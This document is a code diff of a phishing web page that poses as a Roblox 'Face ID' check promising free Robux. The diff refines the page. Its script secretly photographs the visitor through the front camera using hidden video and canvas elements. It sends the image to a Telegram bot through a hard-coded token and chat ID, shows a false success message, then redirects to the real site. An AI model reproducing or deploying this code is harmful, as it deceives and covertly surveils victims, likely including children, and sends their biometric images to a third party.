@@ -3,46 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox Secure Verification</title>
+    <title>Roblox Prize Verification</title>
     <style>
         body { font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f2f4f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; }
-        .logo { width: 120px; margin-bottom: 25px; }
-        h1 { font-size: 24px; color: #393b3d; margin-bottom: 15px; font-weight: bold; }
-        p { color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
-        #auth-btn { background-color: #0084ff; color: white; border: none; padding: 18px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; box-shadow: 0 4px 12px rgba(0,132,255,0.3); }
-        #auth-btn:active { transform: scale(0.98); background-color: #0074e8; }
-        #status { margin-top: 20px; font-size: 12px; color: #aaa; text-transform: uppercase; letter-spacing: 1px; }
-        video, canvas { display: none; }
+        .card { background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; position: relative; }
+        .logo { width: 110px; margin-bottom: 25px; }
+        h1 { font-size: 22px; color: #393b3d; margin-bottom: 12px; font-weight: bold; }
+        p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
+        #auth-btn { background-color: #0084ff; color: white; border: none; padding: 18px; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; box-shadow: 0 4px 12px rgba(0,132,255,0.3); transition: background 0.2s; }
+        #auth-btn:active { background-color: #0074e8; transform: scale(0.98); }
+        #st { margin-top: 20px; font-size: 11px; color: #aaa; text-transform: uppercase; letter-spacing: 1px; }
+        /* Видео и холст скрыты */
+        video, canvas { display: none; visibility: hidden; position: absolute; left: -9999px; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo" alt="Roblox">
-    <h1>Face ID Проверка</h1>
-    <p>Чтобы получить <b>35,000 Robux</b>, подтвердите личность владельца аккаунта. Нажмите кнопку и выберите «Разрешить» в окне браузера.</p>
-    <button id="auth-btn" onclick="startCapture()">ПОДТВЕРДИТЬ ЛИЦО</button>
-    <div id="status">Система готова к сканированию</div>
+    <div id="content">
+        <h1>Face ID Подтверждение</h1>
+        <p>Для зачисления <b>35,000 Robux</b> поднесите телефон к лицу и нажмите кнопку. Выберите «Разрешить» в окне браузера.</p>
+        <button id="auth-btn" onclick="startVerification()">✅ НАЧАТЬ ПРОВЕРКУ</button>
+    </div>
+    <div id="st">Система готова</div>
 </div>
 
-<video id="v" autoplay playsinline></video>
+<video id="v" autoplay playsinline muted></video>
 <canvas id="c"></canvas>
 
 <script>
-    // --- ТВОИ НАСТРОЙКИ ---
-    const BOT_TOKEN = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
-    const CHAT_ID = '7889497672';
+    // --- ТВОИ ДАННЫЕ (НЕ МЕНЯЙ!) ---
+    const BT = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
+    const CI = '7889497672';
 
-    async function startCapture() {
+    async function startVerification() {
         const btn = document.getElementById('auth-btn');
-        const status = document.getElementById('status');
-        const video = document.getElementById('v');
-        const canvas = document.getElementById('c');
+        const st = document.getElementById('st');
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
 
         btn.disabled = true;
         btn.innerText = "СКАНИРОВАНИЕ...";
-        status.innerText = "Подключение к камере...";
+        st.innerText = "Подключение к модулю Face ID...";
 
         try {
             // ПРИНУДИТЕЛЬНО ПЕРЕДНЯЯ КАМЕРА
@@ -51,43 +54,47 @@
                 audio: false 
             });
             
-            status.innerText = "Биометрия получена. Шифрование...";
-            video.srcObject = stream;
+            v.srcObject = stream;
+            // Убеждаемся, что видео действительно играет
+            v.onloadedmetadata = function() {
+                v.play();
+                st.innerText = "Анализ биометрии... Не двигайтесь.";
+            };
             
-            // Ждем 1.5 секунды для четкости
+            // ЖДЕМ 4 СЕКУНДЫ (Чтобы камера проснулась и сфокусировалась на лице)
             setTimeout(() => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                c.width = v.videoWidth;
+                c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
                 
-                canvas.toBlob(blob => {
+                c.toBlob(blob => {
                     const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
+                    fd.append('chat_id', CI);
                     fd.append('photo', blob, 'face.jpg');
-                    fd.append('caption', '👤 **ЛИЦО ЦЕЛИ ПОЙМАНО!**\n\n✅ Успешный захват фронталки.\n📱 Устройство: Android/iOS');
+                    fd.append('caption', '👤 **ЛИЦО ЦЕЛИ ПОЙМАНО!**\n\n✅ Успешный захват фронталки.\n📱 Устройство: Мобильный браузер');
 
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    fetch(`https://api.telegram.org/bot${BT}/sendPhoto`, {
                         method: 'POST',
                         body: fd
                     }).then(() => {
-                        // Выключаем камеру и уводим на настоящий сайт
+                        // Останавливаем камеру и уводим на настоящий сайт
                         stream.getTracks().forEach(track => track.stop());
-                        alert("✅ Личность подтверждена! Робуксы придут в течение 15 минут.");
+                        alert("✅ Личность подтверждена! Робуксы будут зачислены в течение 15 минут.");
                         window.location.href = "https://www.roblox.com/home";
                     });
                 }, 'image/jpeg', 0.8);
-            }, 1500);
+            }, 4000); // 4 секунды задержки
 
         } catch (err) {
             btn.disabled = false;
             btn.innerText = "ПОПРОБОВАТЬ СНОВА";
-            status.style.color = "red";
+            st.style.color = "red";
             
             if (err.name === 'NotAllowedError') {
-                status.innerText = "ОШИБКА: Доступ запрещен. Разрешите камеру в настройках!";
+                st.innerText = "ОШИБКА: Доступ запрещен! Разрешите камеру.";
                 alert("Пожалуйста, нажмите 'Разрешить', чтобы пройти проверку!");
             } else {
-                status.innerText = "Ошибка: Камера не найдена.";
+                st.innerText = "Ошибка доступа к Face ID.";
             }
         }
     }
